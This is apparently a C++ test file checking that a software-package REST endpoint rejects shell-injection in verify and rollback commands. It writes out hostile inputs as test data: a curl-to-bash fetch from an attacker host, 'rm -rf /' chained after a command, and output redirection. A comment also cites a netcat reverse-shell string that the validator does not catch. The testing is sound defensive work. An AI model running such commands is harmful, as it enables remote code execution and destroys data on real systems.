/**
 * test_rest_software_packages.cpp — HTTP-level tests for the input-validation
 * guard added to `POST /api/v1/software-packages` per #771 / W7.5.
 *
 * The bug: `verify_command` and `rollback_command` on a SoftwarePackage were
 * persisted from REST input without any validation. Any operator with
 * `SoftwareDeployment:Write` could stage `"curl http://attacker.com/sh | bash"`
 * as a verify_command — fleet-RCE-class once the deployment-execution path is
 * wired up. PR 1 of the W7.5 ladder rejects shell metacharacters at REST
 * input time; PR 2 (filed as follow-up) will replace the free-form strings
 * with a structured action protocol.
 *
 * These tests cover:
 *   - Happy path: realistic msiexec / reg / wmic / dpkg / PowerShell commands
 *     pass validation and create the package.
 *   - Injection rejection: shell-chaining (`;`, `&`, `|`), substitution
 *     (`` ` ``, `$`), redirection (`<`, `>`), subshell (`(`, `)`), multi-line
 *     all return 400 with explicit error and a security-audit row.
 *   - Length cap (512 chars) — anything longer is rejected.
 *   - Rejection happens BEFORE the store sees the payload (no partial-state
 *     write).
 *
 * Fixture mirrors the in-process TestRouteSink pattern from
 * test_rest_api_tokens.cpp: no socket, no acceptor thread, no TSan risk.
 */

#include "audit_store.hpp"
#include "rest_api_v1.hpp"
#include "software_deployment_store.hpp"
#include "test_route_sink.hpp"

#include <yuzu/metrics.hpp>

#include <catch2/catch_test_macros.hpp>

#include <httplib.h>

#include "../test_helpers.hpp"

#include <filesystem>
#include <string>
#include <vector>

namespace fs = std::filesystem;
using namespace yuzu::server;

namespace {

struct AuditRecord {
    std::string action;
    std::string result;
    std::string target_id;
    std::string detail;
};

struct SwPkgHarness {
    yuzu::server::test::TestRouteSink sink;

    fs::path db_path;
    std::unique_ptr<SoftwareDeploymentStore> sw_deploy_store;

    std::string session_user{"admin"};
    auth::Role session_role{auth::Role::admin};

    std::vector<AuditRecord> audit_log;

    yuzu::MetricsRegistry metrics;
    RestApiV1 api;

    SwPkgHarness() : db_path(yuzu::test::unique_temp_path("rest-sw-pkg-")) {
        fs::remove(db_path);
        sw_deploy_store = std::make_unique<SoftwareDeploymentStore>(db_path);
        REQUIRE(sw_deploy_store->is_open());

        auto auth_fn = [this](const httplib::Request&,
                              httplib::Response&) -> std::optional<auth::Session> {
            if (session_user.empty())
                return std::nullopt;
            auth::Session s;
            s.username = session_user;
            s.role = session_role;
            return s;
        };
        auto perm_fn = [](const httplib::Request&, httplib::Response&, const std::string&,
                          const std::string&) -> bool {
            return true;
        };
        auto audit_fn = [this](const httplib::Request&, const std::string& action,
                               const std::string& result, const std::string&,
                               const std::string& target_id, const std::string& detail) -> bool {
            audit_log.push_back({action, result, target_id, detail});
            return true;
        };

        api.register_routes(sink, auth_fn, perm_fn, audit_fn,
                            /*rbac_store=*/nullptr,
                            /*mgmt_store=*/nullptr,
                            /*token_store=*/nullptr,
                            /*quarantine_store=*/nullptr,
                            /*response_store=*/nullptr,
                            /*instruction_store=*/nullptr,
                            /*execution_tracker=*/nullptr,
                            /*schedule_engine=*/nullptr,
                            /*approval_manager=*/nullptr,
                            /*tag_store=*/nullptr,
                            /*audit_store=*/nullptr,
                            /*service_group_fn=*/{},
                            /*tag_push_fn=*/{},
                            /*inventory_store=*/nullptr,
                            /*product_pack_store=*/nullptr, sw_deploy_store.get(),
                            /*device_token_store=*/nullptr,
                            /*license_store=*/nullptr,
                            /*guaranteed_state_store=*/nullptr,
                            /*metrics_registry=*/&metrics);
    }

    ~SwPkgHarness() {
        sw_deploy_store.reset();
        fs::remove(db_path);
    }

    /// Build a JSON body for POST /api/v1/software-packages with arbitrary
    /// verify_command / rollback_command. Other fields use safe defaults.
    static std::string make_body(const std::string& verify_cmd,
                                 const std::string& rollback_cmd = "",
                                 const std::string& name = "Firefox") {
        std::string body = R"({"name":")" + name +
                           R"(","version":"125.0",)"
                           R"("platform":"windows","installer_type":"msi",)"
                           R"("verify_command":")";
        body += verify_cmd;
        body += R"(","rollback_command":")";
        body += rollback_cmd;
        body += R"("})";
        return body;
    }

    auto post(const std::string& body) { return sink.Post("/api/v1/software-packages", body); }
};

} // namespace

// ── Happy path: realistic install verification vocabulary ────────────────────

TEST_CASE("REST POST software-packages: msiexec verify_command accepted",
          "[rest][software_deployment][771]") {
    SwPkgHarness h;
    // MSI product GUID — braces are intentionally NOT shell-metachars on the
    // agent side (we execvp / CreateProcessW, no shell), so they are allowed.
    auto res =
        h.post(SwPkgHarness::make_body("msiexec /x {12345678-1234-1234-1234-123456789ABC} /qn"));
    REQUIRE(res);
    CHECK(res->status == 201);
    REQUIRE(h.audit_log.size() == 1);
    CHECK(h.audit_log[0].action == "software_package.create");
    CHECK(h.audit_log[0].result == "success");
}

TEST_CASE("REST POST software-packages: reg-query verify_command accepted",
          "[rest][software_deployment][771]") {
    SwPkgHarness h;
    auto res =
        h.post(SwPkgHarness::make_body(R"(reg query HKLM\\Software\\Mozilla)", "", "Firefox-reg"));
    REQUIRE(res);
    CHECK(res->status == 201);
}

TEST_CASE("REST POST software-packages: dpkg verify_command accepted",
          "[rest][software_deployment][771]") {
    SwPkgHarness h;
    auto res = h.post(
        SwPkgHarness::make_body("dpkg -s firefox", "apt-get remove -y firefox", "Firefox-deb"));
    REQUIRE(res);
    CHECK(res->status == 201);
}

TEST_CASE("REST POST software-packages: empty verify+rollback accepted (optional fields)",
          "[rest][software_deployment][771]") {
    SwPkgHarness h;
    auto res = h.post(SwPkgHarness::make_body("", "", "Firefox-no-verify"));
    REQUIRE(res);
    CHECK(res->status == 201);
}

// ── Injection rejection: cluster-2 RCE attack vector ─────────────────────────

TEST_CASE("REST POST software-packages: pipe-to-shell verify_command rejected",
          "[rest][software_deployment][771][security]") {
    SwPkgHarness h;
    // The exact PoC from #771's issue body.
    auto res = h.post(SwPkgHarness::make_body("curl http://attacker.com/shell.sh | bash"));
    REQUIRE(res);
    CHECK(res->status == 400);
    REQUIRE(h.audit_log.size() == 1);
    CHECK(h.audit_log[0].action == "software_package.create");
    CHECK(h.audit_log[0].result == "rejected");
    CHECK(h.audit_log[0].detail.find("verify_command") != std::string::npos);
    // No package was persisted.
    CHECK(h.sw_deploy_store->list_packages().empty());
}

TEST_CASE("REST POST software-packages: injection via rollback_command rejected",
          "[rest][software_deployment][771][security]") {
    SwPkgHarness h;
    // verify_command is benign; the injection is in rollback_command. The
    // rejection must surface that specific field by name in the audit detail
    // so an operator triaging an attempted injection sees which field was
    // weaponised.
    auto res =
        h.post(SwPkgHarness::make_body("dpkg -s firefox", "apt-get remove -y firefox; rm -rf /"));
    REQUIRE(res);
    CHECK(res->status == 400);
    REQUIRE(h.audit_log.size() == 1);
    CHECK(h.audit_log[0].action == "software_package.create");
    CHECK(h.audit_log[0].result == "rejected");
    CHECK(h.audit_log[0].detail.find("rollback_command") != std::string::npos);
    CHECK(h.sw_deploy_store->list_packages().empty());
}

// Note on validator scope: this PR blocks INJECTION-VIA-SHELL-METACHARACTERS,
// not dangerous PROGRAMS by name. A string like `"nc -e /bin/sh attacker 4444"`
// will pass character validation because it contains no shell metachars — when
// execvp'd without a shell, netcat is invoked literally with those args
// (still dangerous, but a different attack class). Blocking that requires
// either an executable allowlist (brittle) or the structured-action protocol
// proposed for PR 2 of the W7.5 ladder, which replaces free-form strings with
// references to whitelisted InstructionDefinitions. Tracked separately.

TEST_CASE("REST POST software-packages: semicolon command chaining rejected",
          "[rest][software_deployment][771][security]") {
    SwPkgHarness h;
    auto res = h.post(SwPkgHarness::make_body("dpkg -s firefox; rm -rf /"));
    REQUIRE(res);
    CHECK(res->status == 400);
}

TEST_CASE("REST POST software-packages: backtick substitution rejected",
          "[rest][software_deployment][771][security]") {
    SwPkgHarness h;
    auto res = h.post(SwPkgHarness::make_body("echo `whoami`"));
    REQUIRE(res);
    CHECK(res->status == 400);
}

TEST_CASE("REST POST software-packages: dollar-paren substitution rejected",
          "[rest][software_deployment][771][security]") {
    SwPkgHarness h;
    auto res = h.post(SwPkgHarness::make_body("echo $(whoami)"));
    REQUIRE(res);
    CHECK(res->status == 400);
}

TEST_CASE("REST POST software-packages: stdout redirection rejected",
          "[rest][software_deployment][771][security]") {
    SwPkgHarness h;
    auto res = h.post(SwPkgHarness::make_body("dpkg -s firefox > /tmp/leak"));
    REQUIRE(res);
    CHECK(res->status == 400);
}

TEST_CASE("REST POST software-packages: && chaining rejected",
          "[rest][software_deployment][771][security]") {
    SwPkgHarness h;
    auto res = h.post(SwPkgHarness::make_body("ok && evil"));
    REQUIRE(res);
    CHECK(res->status == 400);
}

TEST_CASE("REST POST software-packages: oversize command rejected",
          "[rest][software_deployment][771][security]") {
    SwPkgHarness h;
    std::string big(600, 'a'); // exceeds 512-char cap
    auto res = h.post(SwPkgHarness::make_body(big));
    REQUIRE(res);
    CHECK(res->status == 400);
}

TEST_CASE("REST POST software-packages: exactly-at-cap command accepted",
          "[rest][software_deployment][771]") {
    SwPkgHarness h;
    std::string at_cap(512, 'a');
    auto res = h.post(SwPkgHarness::make_body(at_cap, "", "ExactCap"));
    REQUIRE(res);
    CHECK(res->status == 201);
}
